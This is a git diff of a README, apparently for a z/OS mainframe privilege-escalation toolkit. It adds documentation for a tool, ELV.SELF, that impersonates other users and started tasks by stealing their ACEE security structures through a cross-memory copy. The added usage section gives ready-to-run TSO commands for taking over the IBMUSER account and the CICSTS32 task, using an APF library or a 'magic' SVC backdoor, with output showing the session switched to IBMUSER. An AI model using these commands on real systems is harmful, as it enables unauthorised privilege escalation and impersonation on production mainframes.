@@ -44,4 +44,62 @@ http://www.mzelden.com/mvsfiles/iplinfo.txt
 
 
 ## ELV.SELF
-Incognito on z/OS...Coming soon
+The tool lists address spaces currently running on z/OS: started tasks, tso users and jobs  
+The user can choose an address space to "impersonate" by stealing their ACEE structure.  
+The tool will perform cross memory copy to steal the privileges of the target and patch the current TSO session  
+Requirement : APF library with ALTER access OR "magic" SVC (see above)
+
+### Usage
+ ```  
+List active address spaces  
+ TSO> ex 'ELV.SELF' 'LIST'  
+ 
+ *** Listing active address spaces ***
+  
+ **** Started Task - Owner *****
+ NETVSSI   -
+ NETVIEW   -
+ NETVSAM   -
+ RACF      -  START2
+ JES2      -
+ DLF       -
+ RRS       -
+ VLF       -
+ LLA       -
+ CICSTS32  -  START2
+ RMF       -  START2
+ NET       -  START2
+ RMFGAT    -  START2
+ TCPIP     -  TCPIP
+ TSO       -  START1
+ PORTMAP   -  START2
+  
+ **** TSO Users - Owner ****
+ ZERO     -  ZERO
+ IBMUSER   -  IBMUSER
+  
+ **** Jobs - Owner ****
+ FTPD1     -  FTPD
+ INETD4    -  OMVSKERN
+
+
+Impresonate TSO user IBMUSER, using APF library  
+TSO > ex 'ELV.SELF' 'TAR=IBMUSER APF=USER.LINKLIB'  
+      
+Warning: No RACF profile defined for USER.LINKLIB  
+Might not be able to write to USER.LINKLIB  
+Got ASID 80 for IBMUSER  
+Got ASID 38 for current session  
+Local ACEE at  008FC6F0  
+Compiling  UNCVDDF in APF USER.LINKLIB  
+
+TSO > LU
+USER=IBMUSER  NAME=*******  OWNER=IBMUSER   CREATED=*****
+
+
+Impresonate Started task CICSTS32, using magic SVC 233 (register 10 to AAAA to grant access)      
+     ex 'ELV.SELF' 'TAR=CICSTS32 DSN=TEST.PDS SVC=233 10=C1C1C1C1'  
+Impresonate Started task CICSTS32, using magic SVC 233     
+     ex 'ELV.SELF' 'TAR=CICSTS32 DSN=TEST.PDS SVC=233'  
+```  
+
